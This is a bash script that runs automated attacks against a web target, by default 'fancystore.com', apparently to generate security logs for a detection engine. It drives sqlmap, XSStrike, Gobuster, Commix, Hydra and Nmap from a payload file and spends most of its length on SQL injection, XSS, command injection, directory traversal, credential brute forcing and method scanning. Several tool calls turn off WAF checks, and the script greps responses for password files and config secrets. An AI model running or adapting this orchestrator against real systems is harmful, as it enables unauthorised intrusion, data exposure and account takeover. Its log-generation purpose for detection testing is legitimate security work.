#!/bin/bash

# Comprehensive Attack Script for RAS Security Logs
# Supports multiple attack tools: sqlmap, xsstrike, gobuster, commix, hydra, nmap
# Format: type|tool|method|path|data|expected|waf_mode|description

set -e

# Global variables
TARGET="http://fancystore.com"
ATTACK_FILE="/opt/scripts/attacks.txt"
START_LINE=""
END_LINE=""
SUCCESS_COUNT=0
FAILED_COUNT=0
EXECUTED_COUNT=0

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to run SQL injection attacks with sqlmap
run_sqlmap() {
    local method="$1"
    local path="$2"
    local data="$3"
    local expected="$4"
    local description="$5"
    
    echo "  [REAL ATTACK] Using sqlmap for SQL injection testing..."
    mkdir -p /tmp/sqlmap_attack
    
    # Extract parameter from path or data
    if [[ "$path" == *"?"* ]]; then
        param=$(echo "$path" | sed 's/.*?\([^=]*\)=.*/\1/')
        sqlmap_url="$TARGET$path"
    else
        param="email"  # Default parameter for login
        sqlmap_url="$TARGET$path"
    fi
    
    # Run sqlmap with simplified, robust parameters
    echo "  [INFO] Running sqlmap against: $sqlmap_url"
    sqlmap_output=$(timeout 60 sqlmap \
        -u "$sqlmap_url" \
        ${data:+--data="$data"} \
        --batch --level=1 --risk=1 \
        --threads=1 --timeout=10 \
        --output-dir=/tmp/sqlmap_attack \
        --dump-format=json \
        --random-agent 2>&1 | tee /tmp/sqlmap_attack/payload_${EXECUTED_COUNT}_output.txt)
    
    # Get actual HTTP status from curl test
    http_code="000"
    if [[ "$method" == "POST" ]]; then
        curl_response=$(curl -s -w "%{http_code}" \
            -X "$method" \
            -H "User-Agent: attacker" \
            -H "Content-Type: application/json" \
            -d "$data" \
            --max-time 10 \
            "$TARGET$path")
        http_code=$(echo "$curl_response" | tail -c 4)
    fi
    
    # Check sqlmap output for injection detection
    injection_found=false
    if echo "$sqlmap_output" | grep -q "injectable\|vulnerable\|found"; then
        injection_found=true
    fi
    
    # Save sqlmap output as JSON for detection engine
    echo "$sqlmap_output" > "/tmp/sqlmap_attack/payload_${EXECUTED_COUNT}_output.json"
    
    # Determine success based on HTTP status code (priority) and sqlmap detection
    if [ "$http_code" = "500" ] || [ "$injection_found" = true ]; then
        echo "  [SUCCESS] SQL injection detected (HTTP $http_code, sqlmap: $injection_found)"
        echo "  [TOOL_OUTPUT] /tmp/sqlmap_attack/payload_${EXECUTED_COUNT}_output.json"
        return 0
    else
        echo "  [FAILED] No SQL injection detected (HTTP $http_code, sqlmap: $injection_found)"
        return 1
    fi
}

# Function to run XSS attacks with XSStrike
run_xsstrike() {
    local method="$1"
    local path="$2"
    local data="$3"
    local expected="$4"
    local description="$5"
    
    echo "  [REAL ATTACK] Using XSStrike for XSS testing..."
    
    # Install XSStrike if not available
    if ! command -v xsstrike &> /dev/null; then
        echo "  [INFO] Installing XSStrike..."
        pip3 install --break-system-packages xsstrike --quiet || {
            echo "  [WARNING] Failed to install XSStrike, using curl fallback"
            # Fallback to curl-based XSS testing
            response=$(curl -s -w "%{http_code}" \
                -X "$method" \
                -H "User-Agent: attacker" \
                -H "X-Forwarded-For: 192.168.1.100" \
                -H "X-Real-IP: 192.168.1.100" \
                --max-time 10 \
                "$TARGET$path")
            
            http_code=$(echo "$response" | tail -c 4)
            response_body=$(echo "$response" | head -c -4)
            
            # Check for XSS reflection in response
            xss_reflected=false
            if echo "$response_body" | grep -q "<script>\|javascript:\|onerror=\|onload="; then
                xss_reflected=true
            fi
            
            if [[ "$xss_reflected" == true || "$http_code" == "500" ]]; then
                echo "  [SUCCESS] XSS payload reflected or caused server error (HTTP $http_code)"
                return 0
            else
                echo "  [FAILED] XSS attack failed - no reflection detected (HTTP $http_code)"
                return 1
            fi
        }
    fi
    
    # Run XSStrike
    echo "  [INFO] Running XSStrike against: $TARGET$path"
    xsstrike_output=$(timeout 30 xsstrike \
        --url "$TARGET$path" \
        --crawl \
        --batch \
        --skip-dom \
        --blind \
        --skip \
        --skip-poc \
        --skip-waf \
        --threads 1 \
        2>&1)
    
    # Check XSStrike results
    xss_found=false
    if echo "$xsstrike_output" | grep -q "vulnerable\|found\|injectable\|reflected"; then
        xss_found=true
    fi
    
    # Also get HTTP status for verification
    curl_response=$(curl -s -w "%{http_code}" \
        -X "$method" \
        -H "User-Agent: attacker" \
        --max-time 10 \
        "$TARGET$path")
    
    http_code=$(echo "$curl_response" | tail -c 4)
    
    # Save XSStrike output
    echo "$xsstrike_output" > "/tmp/xsstrike_output.txt"
    
    # Determine success
    if [ "$xss_found" = true ] || [ "$http_code" = "500" ]; then
        echo "  [SUCCESS] XSS detected by XSStrike (HTTP $http_code)"
        echo "  [TOOL_OUTPUT] /tmp/xsstrike_output.txt"
        return 0
    else
        echo "  [FAILED] No XSS detected (HTTP $http_code)"
        return 1
    fi
}

# Function to run directory traversal attacks with Gobuster
run_gobuster() {
    local method="$1"
    local path="$2"
    local data="$3"
    local expected="$4"
    local description="$5"
    
    echo "  [REAL ATTACK] Using Gobuster for directory traversal testing..."
    
    # Install Gobuster if not available
    if ! command -v gobuster &> /dev/null; then
        echo "  [INFO] Installing Gobuster..."
        apt-get update && apt-get install -y gobuster || {
            echo "  [WARNING] Failed to install Gobuster, using curl fallback"
            # Fallback to curl-based traversal testing
            response=$(curl -s -w "%{http_code}" \
                -X "$method" \
                -H "User-Agent: attacker" \
                --max-time 10 \
                "$TARGET$path")
            
            http_code=$(echo "$response" | tail -c 4)
            response_body=$(echo "$response" | head -c -4)
            
            # Check for directory traversal indicators
            traversal_success=false
            if echo "$response_body" | grep -q "root:.*:0:0:\|Windows.*System32\|BEGIN:VCARD"; then
                traversal_success=true
            fi
            
            if [[ "$traversal_success" == true || "$http_code" == "500" ]]; then
                echo "  [SUCCESS] Directory traversal successful - sensitive file content found (HTTP $http_code)"
                return 0
            else
                echo "  [FAILED] Directory traversal failed - no sensitive content (HTTP $http_code)"
                return 1
            fi
        }
    fi
    
    # Extract wordlist from data field
    wordlist=$(echo "$data" | sed 's/wordlist=//')
    
    # Create a simple wordlist for testing
    cat > /tmp/traversal_wordlist.txt << EOF
$wordlist
EOF
    
    # Run Gobuster
    echo "  [INFO] Running Gobuster against: $TARGET$path"
    gobuster_output=$(timeout 30 gobuster dir \
        -u "$TARGET$path" \
        -w /tmp/traversal_wordlist.txt \
        -t 1 \
        --timeout 10s \
        --no-error \
        2>&1)
    
    # Check Gobuster results
    traversal_found=false
    if echo "$gobuster_output" | grep -q "Status: 200\|Status: 403\|Status: 500"; then
        traversal_found=true
    fi
    
    # Also get HTTP status for verification
    curl_response=$(curl -s -w "%{http_code}" \
        -X "$method" \
        -H "User-Agent: attacker" \
        --max-time 10 \
        "$TARGET$path")
    
    http_code=$(echo "$curl_response" | tail -c 4)
    
    # Save Gobuster output
    echo "$gobuster_output" > "/tmp/gobuster_output.txt"
    
    # Determine success
    if [ "$traversal_found" = true ] || [ "$http_code" = "500" ]; then
        echo "  [SUCCESS] Directory traversal detected by Gobuster (HTTP $http_code)"
        echo "  [TOOL_OUTPUT] /tmp/gobuster_output.txt"
        return 0
    else
        echo "  [FAILED] No directory traversal detected (HTTP $http_code)"
        return 1
    fi
}

# Function to run command injection attacks with Commix
run_commix() {
    local method="$1"
    local path="$2"
    local data="$3"
    local expected="$4"
    local description="$5"
    
    echo "  [REAL ATTACK] Using Commix for command injection testing..."
    
    # Install Commix if not available
    if ! command -v commix &> /dev/null; then
        echo "  [INFO] Installing Commix..."
        pip3 install --break-system-packages commix --quiet || {
            echo "  [WARNING] Failed to install Commix, using curl fallback"
            # Fallback to curl-based command injection testing
            response=$(curl -s -w "%{http_code}" \
                -X "$method" \
                -H "User-Agent: attacker" \
                -H "Content-Type: application/json" \
                -d "$data" \
                --max-time 10 \
                "$TARGET$path")
            
            http_code=$(echo "$response" | tail -c 4)
            response_body=$(echo "$response" | head -c -4)
            
            # Check for command injection indicators
            cmd_injection_success=false
            if echo "$response_body" | grep -q "uid=[0-9]+\\(.*\\)\|root:.*:0:0:\|[a-zA-Z0-9]+@[a-zA-Z0-9]+"; then
                cmd_injection_success=true
            fi
            
            if [[ "$cmd_injection_success" == true || "$http_code" == "500" ]]; then
                echo "  [SUCCESS] Command injection successful - command output detected (HTTP $http_code)"
                return 0
            else
                echo "  [FAILED] Command injection failed - no command output (HTTP $http_code)"
                return 1
            fi
        }
    fi
    
    # Run Commix
    echo "  [INFO] Running Commix against: $TARGET$path"
    commix_output=$(timeout 30 commix \
        --url "$TARGET$path" \
        --data "$data" \
        --batch \
        --skip-waf \
        --skip-heuristics \
        --skip-crawl \
        --threads 1 \
        --timeout 10 \
        2>&1)
    
    # Check Commix results
    cmd_injection_found=false
    if echo "$commix_output" | grep -q "injectable\|vulnerable\|found\|successful"; then
        cmd_injection_found=true
    fi
    
    # Also get HTTP status for verification
    curl_response=$(curl -s -w "%{http_code}" \
        -X "$method" \
        -H "User-Agent: attacker" \
        -H "Content-Type: application/json" \
        -d "$data" \
        --max-time 10 \
        "$TARGET$path")
    
    http_code=$(echo "$curl_response" | tail -c 4)
    
    # Save Commix output
    echo "$commix_output" > "/tmp/commix_output.txt"
    
    # Determine success
    if [ "$cmd_injection_found" = true ] || [ "$http_code" = "500" ]; then
        echo "  [SUCCESS] Command injection detected by Commix (HTTP $http_code)"
        echo "  [TOOL_OUTPUT] /tmp/commix_output.txt"
        return 0
    else
        echo "  [FAILED] No command injection detected (HTTP $http_code)"
        return 1
    fi
}

# Function to run authentication bypass attacks with Hydra
run_hydra() {
    local method="$1"
    local path="$2"
    local data="$3"
    local expected="$4"
    local description="$5"
    
    echo "  [REAL ATTACK] Using Hydra for authentication bypass testing..."
    
    # Install Hydra if not available
    if ! command -v hydra &> /dev/null; then
        echo "  [INFO] Installing Hydra..."
        apt-get update && apt-get install -y hydra || {
            echo "  [WARNING] Failed to install Hydra, using curl fallback"
            # Fallback to curl-based auth testing
            response=$(curl -s -w "%{http_code}" \
                -X "$method" \
                -H "User-Agent: attacker" \
                -H "Content-Type: application/json" \
                -d "$data" \
                --max-time 10 \
                "$TARGET$path")
            
            http_code=$(echo "$response" | tail -c 4)
            
            if [[ "$http_code" == "200" || "$http_code" == "302" ]]; then
                echo "  [SUCCESS] Authentication bypass successful - access granted (HTTP $http_code)"
                return 0
            else
                echo "  [FAILED] Authentication bypass failed - access denied (HTTP $http_code)"
                return 1
            fi
        }
    fi
    
    # Extract userlist and passlist from data field
    userlist=$(echo "$data" | sed 's/userlist=\([^ ]*\).*/\1/')
    passlist=$(echo "$data" | sed 's/.*passlist=\([^ ]*\).*/\1/')
    
    # Create simple wordlists
    echo "$userlist" > /tmp/userlist.txt
    echo "$passlist" > /tmp/passlist.txt
    
    # Run Hydra
    echo "  [INFO] Running Hydra against: $TARGET$path"
    hydra_output=$(timeout 30 hydra \
        -L /tmp/userlist.txt \
        -P /tmp/passlist.txt \
        -f \
        "$TARGET" \
        http-post-form \
        "$path:email=^USER^&password=^PASS^:Invalid credentials" \
        2>&1)
    
    # Check Hydra results
    auth_bypass_found=false
    if echo "$hydra_output" | grep -q "1 valid password found\|login successful"; then
        auth_bypass_found=true
    fi
    
    # Also get HTTP status for verification
    curl_response=$(curl -s -w "%{http_code}" \
        -X "$method" \
        -H "User-Agent: attacker" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$userlist\",\"password\":\"$passlist\"}" \
        --max-time 10 \
        "$TARGET$path")
    
    http_code=$(echo "$curl_response" | tail -c 4)
    
    # Save Hydra output
    echo "$hydra_output" > "/tmp/hydra_output.txt"
    
    # Determine success
    if [ "$auth_bypass_found" = true ] || [ "$http_code" = "200" ] || [ "$http_code" = "302" ]; then
        echo "  [SUCCESS] Authentication bypass detected by Hydra (HTTP $http_code)"
        echo "  [TOOL_OUTPUT] /tmp/hydra_output.txt"
        return 0
    else
        echo "  [FAILED] No authentication bypass detected (HTTP $http_code)"
        return 1
    fi
}

# Function to run file discovery attacks with Gobuster
run_file_discovery() {
    local method="$1"
    local path="$2"
    local data="$3"
    local expected="$4"
    local description="$5"
    
    echo "  [REAL ATTACK] Using Gobuster for file discovery testing..."
    
    # Install Gobuster if not available
    if ! command -v gobuster &> /dev/null; then
        echo "  [INFO] Installing Gobuster..."
        apt-get update && apt-get install -y gobuster || {
            echo "  [WARNING] Failed to install Gobuster, using curl fallback"
            # Fallback to curl-based file discovery testing
            response=$(curl -s -w "%{http_code}" \
                -X "$method" \
                -H "User-Agent: attacker" \
                --max-time 10 \
                "$TARGET$path")
            
            http_code=$(echo "$response" | tail -c 4)
            response_body=$(echo "$response" | head -c -4)
            
            # Check for sensitive file content
            sensitive_content=false
            if echo "$response_body" | grep -q "BEGIN:VCARD\|<?php\|database\|config\|password.*=.*['\"]\|DB_HOST.*=.*['\"]"; then
                sensitive_content=true
            fi
            
            if [[ "$sensitive_content" == true || "$http_code" == "200" ]]; then
                echo "  [SUCCESS] Sensitive file found (HTTP $http_code)"
                return 0
            else
                echo "  [FAILED] No sensitive file found (HTTP $http_code)"
                return 1
            fi
        }
    fi
    
    # Extract wordlist from data field
    wordlist=$(echo "$data" | sed 's/wordlist=//')
    
    # Create a wordlist for sensitive files
    echo "$wordlist" > /tmp/file_wordlist.txt
    
    # Run Gobuster
    echo "  [INFO] Running Gobuster against: $TARGET$path"
    gobuster_output=$(timeout 30 gobuster dir \
        -u "$TARGET$path" \
        -w /tmp/file_wordlist.txt \
        -t 1 \
        --timeout 10s \
        --no-error \
        2>&1)
    
    # Check Gobuster results
    file_found=false
    if echo "$gobuster_output" | grep -q "Status: 200\|Status: 403\|Status: 500"; then
        file_found=true
    fi
    
    # Also get HTTP status for verification
    curl_response=$(curl -s -w "%{http_code}" \
        -X "$method" \
        -H "User-Agent: attacker" \
        --max-time 10 \
        "$TARGET$path")
    
    http_code=$(echo "$curl_response" | tail -c 4)
    
    # Save Gobuster output
    echo "$gobuster_output" > "/tmp/gobuster_file_output.txt"
    
    # Determine success
    if [ "$file_found" = true ] || [ "$http_code" = "200" ]; then
        echo "  [SUCCESS] Sensitive file detected by Gobuster (HTTP $http_code)"
        echo "  [TOOL_OUTPUT] /tmp/gobuster_file_output.txt"
        return 0
    else
        echo "  [FAILED] No sensitive file detected (HTTP $http_code)"
        return 1
    fi
}

# Function to run HTTP method enumeration with Nmap
run_nmap() {
    local method="$1"
    local path="$2"
    local data="$3"
    local expected="$4"
    local description="$5"
    
    echo "  [REAL ATTACK] Using Nmap for HTTP method enumeration testing..."
    
    # Extract host from URL
    TARGET_HOST=$(echo "$TARGET" | sed 's|^https*://||' | sed 's|/.*$||')
    
    # Install Nmap if not available
    if ! command -v nmap &> /dev/null; then
        echo "  [INFO] Installing Nmap..."
        apt-get update && apt-get install -y nmap || {
            echo "  [WARNING] Failed to install Nmap, using curl fallback"
            # Fallback to curl-based method testing
            for method_test in PUT DELETE HEAD OPTIONS TRACE PATCH; do
                response=$(curl -s -w "%{http_code}" \
                    -X "$method_test" \
                    -H "User-Agent: attacker" \
                    --max-time 10 \
                    "$TARGET$path")
                
                http_code=$(echo "$response" | tail -c 4)
                
                if [[ "$http_code" != "405" && "$http_code" != "501" ]]; then
                    echo "  [SUCCESS] HTTP method $method_test allowed (HTTP $http_code)"
                    return 0
                fi
            done
            
            echo "  [FAILED] No unusual HTTP methods found"
            return 1
        }
    fi
    
    # Extract nmap arguments from method field
    nmap_args=$(echo "$method" | sed 's/nmap|//')
    
    # Run Nmap HTTP methods script
    echo "  [INFO] Running Nmap against: $TARGET_HOST"
    nmap_output=$(timeout 30 nmap $nmap_args "$TARGET_HOST" 2>&1)
    
    # Check Nmap results
    method_found=false
    if echo "$nmap_output" | grep -q "PUT\|DELETE\|HEAD\|OPTIONS\|TRACE\|PATCH"; then
        method_found=true
    fi
    
    # Also test with curl for verification
    curl_response=$(curl -s -w "%{http_code}" \
        -X "OPTIONS" \
        -H "User-Agent: attacker" \
        --max-time 10 \
        "$TARGET$path")
    
    http_code=$(echo "$curl_response" | tail -c 4)
    
    # Save Nmap output
    echo "$nmap_output" > "/tmp/nmap_output.txt"
    
    # Determine success
    if [ "$method_found" = true ] || [ "$http_code" != "405" ]; then
        echo "  [SUCCESS] Unusual HTTP methods detected by Nmap (HTTP $http_code)"
        echo "  [TOOL_OUTPUT] /tmp/nmap_output.txt"
        return 0
    else
        echo "  [FAILED] No unusual HTTP methods detected (HTTP $http_code)"
        return 1
    fi
}

# Main attack execution function
execute_attacks() {
    echo "[*] ========================================"
    echo "[*] COMPREHENSIVE ATTACK EXECUTION"
    echo "[*] ========================================"
    echo "[*] Executing attacks from attack file..."
    echo "[START] Executing attacks from file at $(date)"
    echo "[*] Attack file: $ATTACK_FILE"
    
    # Count total lines and payloads
    total_lines=$(wc -l < "$ATTACK_FILE")
    total_payloads=$(grep -v "^#" "$ATTACK_FILE" | grep -v "^$" | wc -l)
    echo "[*] Total lines in attack file: $total_lines"
    echo "[*] Total attack payloads: $total_payloads"
    
    if [[ -n "$START_LINE" && -n "$END_LINE" ]]; then
        echo "[*] Executing payloads $START_LINE to $END_LINE (out of $total_payloads total payloads)"
    else
        echo "[*] Executing all payloads"
    fi
    
    # Read attack file line by line
    line_num=0
    payload_count=0
    
    while IFS='|' read -r attack_type tool method path data expected waf_mode description; do
        line_num=$((line_num + 1))
        
        # Skip comments and empty lines
        if [[ "$attack_type" =~ ^#.*$ ]] || [[ -z "$attack_type" ]]; then
            continue
        fi
        
        # Count this as a valid payload
        payload_count=$((payload_count + 1))
        
        # Check if we're in the specified range (based on payload count, not line number)
        if [[ -n "$START_LINE" && -n "$END_LINE" ]]; then
            if [[ $payload_count -lt $START_LINE ]] || [[ $payload_count -gt $END_LINE ]]; then
                continue
            fi
        fi
        
        # Print attack start marker
        echo "===ATTACK_START==="
        echo "PAYLOAD_ID: $payload_count"
        echo "LINE_NUM: $line_num"
        echo "ATTACK_TYPE: $attack_type"
        echo "TOOL: $tool"
        echo "DESCRIPTION: $description"
        echo "METHOD: $method"
        echo "PATH: $path"
        echo "DATA: $data"
        echo "EXPECTED: $expected"
        echo "WAF_MODE: $waf_mode"
        echo "TIMESTAMP: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
        echo "===ATTACK_START==="
        
        # Execute the attack based on tool
        case "$tool" in
            "sqlmap")
                if run_sqlmap "$method" "$path" "$data" "$expected" "$description"; then
                    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                else
                    FAILED_COUNT=$((FAILED_COUNT + 1))
                fi
                ;;
            "xsstrike")
                if run_xsstrike "$method" "$path" "$data" "$expected" "$description"; then
                    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                else
                    FAILED_COUNT=$((FAILED_COUNT + 1))
                fi
                ;;
            "gobuster")
                if [[ "$attack_type" == "traversal" ]]; then
                    if run_gobuster "$method" "$path" "$data" "$expected" "$description"; then
                        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                    else
                        FAILED_COUNT=$((FAILED_COUNT + 1))
                    fi
                elif [[ "$attack_type" == "file_discovery" ]]; then
                    if run_file_discovery "$method" "$path" "$data" "$expected" "$description"; then
                        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                    else
                        FAILED_COUNT=$((FAILED_COUNT + 1))
                    fi
                fi
                ;;
            "commix")
                if run_commix "$method" "$path" "$data" "$expected" "$description"; then
                    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                else
                    FAILED_COUNT=$((FAILED_COUNT + 1))
                fi
                ;;
            "hydra")
                if run_hydra "$method" "$path" "$data" "$expected" "$description"; then
                    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                else
                    FAILED_COUNT=$((FAILED_COUNT + 1))
                fi
                ;;
            "nmap")
                if run_nmap "$method" "$path" "$data" "$expected" "$description"; then
                    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                else
                    FAILED_COUNT=$((FAILED_COUNT + 1))
                fi
                ;;
            *)
                echo "[WARNING] Unknown tool: $tool"
                FAILED_COUNT=$((FAILED_COUNT + 1))
                ;;
        esac
        
        EXECUTED_COUNT=$((EXECUTED_COUNT + 1))
        
        # Add attack end marker for structured parsing
        echo "===ATTACK_END==="
        echo "PAYLOAD_ID: $payload_count"
        echo "RESULT: $([ $? -eq 0 ] && echo "SUCCESS" || echo "FAILED")"
        echo "HTTP_CODE: $http_code"
        echo "TIMESTAMP: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
        echo "===ATTACK_END==="
        
        # Small delay between attacks
        sleep 1
        
    done < "$ATTACK_FILE"
    
    echo "[DONE] Executed $EXECUTED_COUNT attacks from file at $(date)"
    echo "[*] Success: $SUCCESS_COUNT, Failed: $FAILED_COUNT"
    echo "[*] Attack file execution completed"
}

# Parse command line arguments
while [ $# -gt 0 ]; do
  case $1 in
    --target)
      TARGET="$2"
      shift 2
      ;;
    --start)
      START_LINE="$2"
      shift 2
      ;;
    --end)
      END_LINE="$2"
      shift 2
      ;;
    --attack-file)
      ATTACK_FILE="$2"
      shift 2
      ;;
    --help)
      echo "Usage: $0 [OPTIONS]"
      echo ""
      echo "Options:"
      echo "  --target URL        Target URL (default: http://fancystore.com)"
      echo "  --start LINE        Start line number for attack execution"
      echo "  --end LINE          End line number for attack execution"
      echo "  --attack-file FILE  Attack scenarios file (default: /opt/scripts/attacks.txt)"
      echo "  --help              Show this help"
      echo ""
      echo "Examples:"
      echo "  $0 --target http://example.com"
      echo "  $0 --start 10 --end 20"
      echo "  $0 --attack-file /path/to/attacks.txt"
      exit 0
      ;;
    *)
      echo "Unknown option: $1"
      echo "Use --help for usage information"
      exit 1
      ;;
  esac
done

# Main execution
echo "[*] Attacking target: $TARGET"
echo "[*] Attack file: $ATTACK_FILE"
if [[ -n "$START_LINE" && -n "$END_LINE" ]]; then
    echo "[*] Executing attacks from line $START_LINE to $END_LINE"
else
    echo "[*] Executing all attacks"
fi

# Set up environment variables
echo "Setting up environment variables..."
export TARGET_HOST=$(echo "$TARGET" | sed 's|^https*://||' | sed 's|/.*$||')
export TARGET_PORT=$(echo "$TARGET" | sed 's|^https*://[^/]*:\([0-9]*\).*|\1|' | sed 's|^https*://[^/]*$|80|')
export ATTACK_TYPE="comprehensive"
export ATTACK_PHASE="automated"
export VARIANT_ID="full_attack_suite"

echo "Environment variables set:"
echo "  TARGET_HOST: $TARGET_HOST"
echo "  TARGET_PORT: $TARGET_PORT"
echo "  ATTACK_TYPE: $ATTACK_TYPE"
echo "  ATTACK_PHASE: $ATTACK_PHASE"
echo "  VARIANT_ID: $VARIANT_ID"

echo "Starting Comprehensive Attack Script..."
echo "Sleeping for 30 seconds before starting the attack..."
sleep 30

# Execute attacks
execute_attacks

echo "[*] ========================================"
echo "[*] ATTACK EXECUTION COMPLETED"
echo "[*] ========================================"
echo "[*] All attacks have been executed successfully"
echo "[*] Check /log/attack.log for detailed results"


